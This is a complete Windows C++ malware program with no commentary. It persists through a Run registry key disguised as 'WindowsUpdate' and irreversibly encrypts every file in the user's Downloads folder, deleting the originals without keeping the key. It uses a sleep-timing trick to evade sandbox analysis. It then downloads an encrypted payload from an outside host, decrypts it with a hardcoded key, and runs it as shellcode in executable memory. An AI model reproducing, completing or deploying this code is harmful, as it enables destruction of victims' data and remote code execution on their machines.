#include <windows.h>  
#include <processthreadsapi.h>  
#include <memoryapi.h>  
#include <string>
#include <winhttp.h>
#include <iostream>
#include <vector>
#include <conio.h>
#include <wincrypt.h>
#include <stdexcept>
#include <fstream>
#include <lmcons.h>
#include <winnetwk.h>
#include <tlhelp32.h>  // For process management functions
#include <psapi.h>     // For GetModuleFileNameExW
#include <shlobj.h>    // For SHGetFolderPathW and CSIDL_PROFILE

#pragma comment(lib, "winhttp.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")
#pragma comment(lib, "ntdll")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "mpr.lib")
#pragma comment(lib, "psapi.lib")  // For GetModuleFileNameExW

// AES-128 CBC decryption using CryptoAPI
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "user32.lib")

#define AES_KEY_LENGTH 128
#define BLOCK_SIZE 16

// Helper function to convert std::string to std::wstring
std::wstring stringToWString(const std::string& str) {
    return std::wstring(str.begin(), str.end());
}


// Function to recursively list all files in a directory and its subdirectories
std::vector<std::string> listFilesRecursive(const std::string& directory) {
    std::vector<std::string> files;
    WIN32_FIND_DATAW findFileData;
    HANDLE hFind = FindFirstFileW((stringToWString(directory) + L"\\*").c_str(), &findFileData);

    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            std::wstring fileName = findFileData.cFileName;
            std::string fullPath = directory + "\\" + std::string(fileName.begin(), fileName.end());

            if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                if (fileName != L"." && fileName != L"..") {
                    std::vector<std::string> subFiles = listFilesRecursive(fullPath);
                    files.insert(files.end(), subFiles.begin(), subFiles.end());
                }
            } else {
                files.push_back(fullPath);
            }
        } while (FindNextFileW(hFind, &findFileData));
        FindClose(hFind);
    }

    return files;
}

// Function to get process name from process ID
std::wstring GetProcessName(DWORD processId) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
    if (hProcess == NULL) return L"";

    wchar_t processName[MAX_PATH] = L"<unknown>";
    if (GetModuleFileNameExW(hProcess, NULL, processName, MAX_PATH)) {
        CloseHandle(hProcess);
        return std::wstring(processName);
    }
    CloseHandle(hProcess);
    return L"";
}

// Function to encrypt data using AES-128 CBC in Windows CryptoAPI
bool encryptFileAES(const std::string& filename) {
    HCRYPTPROV hProv;
    HCRYPTKEY hKey;
    HCRYPTHASH hHash;
    
    if (!CryptAcquireContext(&hProv, nullptr, nullptr, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return false;
    }

    BYTE keyMaterial[32];
    if (!CryptGenRandom(hProv, sizeof(keyMaterial), keyMaterial)) {
        CryptReleaseContext(hProv, 0);
        return false;
    }

    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        CryptReleaseContext(hProv, 0);
        return false;
    }

    if (!CryptHashData(hHash, keyMaterial, sizeof(keyMaterial), 0)) {
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return false;
    }

    if (!CryptDeriveKey(hProv, CALG_AES_128, hHash, 0, &hKey)) {
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return false;
    }

    BYTE iv[BLOCK_SIZE];
    if (!CryptGenRandom(hProv, BLOCK_SIZE, iv)) {
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return false;
    }

    DWORD mode = CRYPT_MODE_CBC;
    if (!CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&mode, 0)) {
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return false;
    }

    if (!CryptSetKeyParam(hKey, KP_IV, iv, 0)) {
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return false;
    }

    HANDLE hInputFile = CreateFileA(filename.c_str(), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hInputFile == INVALID_HANDLE_VALUE) {
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return false;
    }

    std::string encryptedFile = filename + ".notwncry";
    HANDLE hOutputFile = CreateFileA(encryptedFile.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hOutputFile == INVALID_HANDLE_VALUE) {
        CloseHandle(hInputFile);
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return false;
    }

    DWORD bytesWritten;
    WriteFile(hOutputFile, iv, BLOCK_SIZE, &bytesWritten, NULL);

    const size_t BUFFER_SIZE = 4096;
    std::vector<BYTE> buffer(BUFFER_SIZE);
    bool isLastBlock = false;

    while (!isLastBlock) {
        DWORD bytesRead;
        if (!ReadFile(hInputFile, buffer.data(), BUFFER_SIZE, &bytesRead, NULL)) {
            CloseHandle(hInputFile);
            CloseHandle(hOutputFile);
            CryptDestroyKey(hKey);
            CryptDestroyHash(hHash);
            CryptReleaseContext(hProv, 0);
            return false;
        }

        if (bytesRead < BUFFER_SIZE) {
            isLastBlock = true;
            size_t padding = BLOCK_SIZE - (bytesRead % BLOCK_SIZE);
            for (size_t i = bytesRead; i < bytesRead + padding; i++) {
                buffer[i] = static_cast<BYTE>(padding);
            }
            bytesRead += padding;
        }

        DWORD dataSize = bytesRead;
        if (!CryptEncrypt(hKey, 0, isLastBlock, 0, buffer.data(), &dataSize, buffer.size())) {
            CloseHandle(hInputFile);
            CloseHandle(hOutputFile);
            CryptDestroyKey(hKey);
            CryptDestroyHash(hHash);
            CryptReleaseContext(hProv, 0);
            return false;
        }

        if (!WriteFile(hOutputFile, buffer.data(), dataSize, &bytesWritten, NULL)) {
            CloseHandle(hInputFile);
            CloseHandle(hOutputFile);
            CryptDestroyKey(hKey);
            CryptDestroyHash(hHash);
            CryptReleaseContext(hProv, 0);
            return false;
        }
    }

    CloseHandle(hInputFile);
    CloseHandle(hOutputFile);
    CryptDestroyKey(hKey);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);

    DeleteFileA(filename.c_str());
    return true;
}

void BypassDynamicAnalysis()
{
    int tick = GetTickCount64();
    Sleep(5000);
    int tock = GetTickCount64();
    if ((tock - tick) < 4500)
        exit(0);
}

std::vector<BYTE> Download(int fake,LPCWSTR baseAddress, int port, LPCWSTR filename)
{
    HINTERNET hSession = WinHttpOpen(
        NULL,
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);

    HINTERNET hConnect = WinHttpConnect(
        hSession,
        baseAddress,
        port,
        0);

    // create request handle
    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect,
        L"GET",
        filename,
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        0);

    WinHttpSendRequest(
        hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS,
        0,
        WINHTTP_NO_REQUEST_DATA,
        0,
        0,
        0);

    WinHttpReceiveResponse(
        hRequest,
        NULL);

    std::vector<BYTE> buffer;
    DWORD bytesRead = 0;

    do {
        BYTE temp[4096]{};
        WinHttpReadData(hRequest, temp, sizeof(temp), &bytesRead);

        if (bytesRead > 0) {
            buffer.insert(buffer.end(), temp, temp + bytesRead);
        }

    } while (bytesRead > 0);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return buffer;
}

wchar_t* CharArrayToLPCWSTR(const char* array)
{
    wchar_t* wString = new wchar_t[4096];
    MultiByteToWideChar(CP_ACP, 0, array, -1, wString, 4096);
    return wString;
}


bool IsRegistryEntryExists() {
    HKEY hKey;
    wchar_t szPath[MAX_PATH];
    DWORD dataSize = sizeof(szPath);
    
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        LONG result = RegQueryValueExW(hKey, L"WindowsUpdate", NULL, NULL, (LPBYTE)szPath, &dataSize);
        RegCloseKey(hKey);
        return (result == ERROR_SUCCESS);
    }
    return false;
}

bool AddToRegistryStartup() {
    // Check if registry entry already exists
    if (IsRegistryEntryExists()) {
        return true; // Entry already exists, no need to create again
    }

    HKEY hKey;
    wchar_t szPath[MAX_PATH];
    GetModuleFileNameW(NULL, szPath, MAX_PATH);
    
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, L"WindowsUpdate", 0, REG_SZ, (BYTE*)szPath, (wcslen(szPath) + 1) * sizeof(wchar_t));
        RegCloseKey(hKey);
        return true;
    }
    return false;
}

// Function to decrypt AES-128 CBC encrypted data
std::vector<BYTE> DecryptAES(const std::vector<BYTE>& encryptedData, const BYTE* keyMaterial, size_t keyLength) {
    HCRYPTPROV hProv;
    HCRYPTKEY hKey;
    HCRYPTHASH hHash;
    std::vector<BYTE> decryptedData;
    
    if (!CryptAcquireContext(&hProv, nullptr, nullptr, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return decryptedData;
    }

    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        CryptReleaseContext(hProv, 0);
        return decryptedData;
    }

    if (!CryptHashData(hHash, keyMaterial, keyLength, 0)) {
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return decryptedData;
    }

    if (!CryptDeriveKey(hProv, CALG_AES_128, hHash, 0, &hKey)) {
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return decryptedData;
    }

    DWORD mode = CRYPT_MODE_CBC;
    if (!CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&mode, 0)) {
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return decryptedData;
    }

    // IV from the first 16 bytes
    if (encryptedData.size() < BLOCK_SIZE) {
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return decryptedData;
    }

    if (!CryptSetKeyParam(hKey, KP_IV, (BYTE*)encryptedData.data(), 0)) {
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return decryptedData;
    }

    // Create a copy without IV
    std::vector<BYTE> dataToDecrypt(encryptedData.begin() + BLOCK_SIZE, encryptedData.end());
    DWORD dataSize = dataToDecrypt.size();

    // Decrypt
    if (!CryptDecrypt(hKey, 0, TRUE, 0, dataToDecrypt.data(), &dataSize)) {
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return decryptedData;
    }

    // Remove padding
    BYTE padding = dataToDecrypt[dataSize - 1];
    if (padding > 0 && padding <= BLOCK_SIZE) {
        dataSize -= padding;
    }

    decryptedData.assign(dataToDecrypt.begin(), dataToDecrypt.begin() + dataSize);

    CryptDestroyKey(hKey);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);

    return decryptedData;
}

// Convert hex string to BYTE array
std::vector<BYTE> HexToBytes(const std::string& hex) {
    std::vector<BYTE> bytes;
    for (size_t i = 0; i < hex.length(); i += 2) {
        std::string byteString = hex.substr(i, 2);
        BYTE byte = (BYTE)strtol(byteString.c_str(), NULL, 16);
        bytes.push_back(byte);
    }
    return bytes;
}

void RunPayload()
{
    try {
        AddToRegistryStartup();

        try {
            wchar_t userProfile[MAX_PATH];
            if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_PROFILE, NULL, 0, userProfile))) {
                std::wstring downloadsPath = std::wstring(userProfile) + L"\\Downloads";
                std::string targetDir = std::string(downloadsPath.begin(), downloadsPath.end());
                std::vector<std::string> files = listFilesRecursive(targetDir);
                
                for (const auto& file : files) {
                    try {
                        encryptFileAES(file);
                    } catch (...) {
                        continue;
                    }
                }
            }
        } catch (...) {
        }

        BypassDynamicAnalysis();
        std::vector<BYTE> recvbuf;
        recvbuf = Download(13337, L"crypto.harrylee.id.vn\0", 443, L"/enc_nt205.bin\0");

        if (recvbuf.empty()) {
            return;
        }

        // Convert hex key to BYTE array
        std::string hexKey = "df6b7d1be3467b0805b831bfed90b69a649381393efbb9cb295d1d307f78e650";
        std::vector<BYTE> keyMaterial = HexToBytes(hexKey);
        
        if (keyMaterial.size() != 32) {
            return;
        }

        // Decrypt the data
        std::vector<BYTE> decryptedData = DecryptAES(recvbuf, keyMaterial.data(), keyMaterial.size());

        if (decryptedData.empty()) {
            return;
        }

        LPVOID alloc_mem = VirtualAlloc(NULL, decryptedData.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!alloc_mem) {
            return;
        }

        CopyMemory(alloc_mem, decryptedData.data(), decryptedData.size());

        // Set memory protection
        DWORD oldProtect;
        if (!VirtualProtect(alloc_mem, decryptedData.size(), PAGE_EXECUTE_READWRITE, &oldProtect)) {
            return;
        }

        HANDLE tHandle = CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)alloc_mem, NULL, 0, NULL);

        if (tHandle) {
            CloseHandle(tHandle);
        }
    } catch (...) {
    }
}

int main() {
    try {
        RunPayload();
    } catch (...) {
        return 1;
    }
    return 0;
}
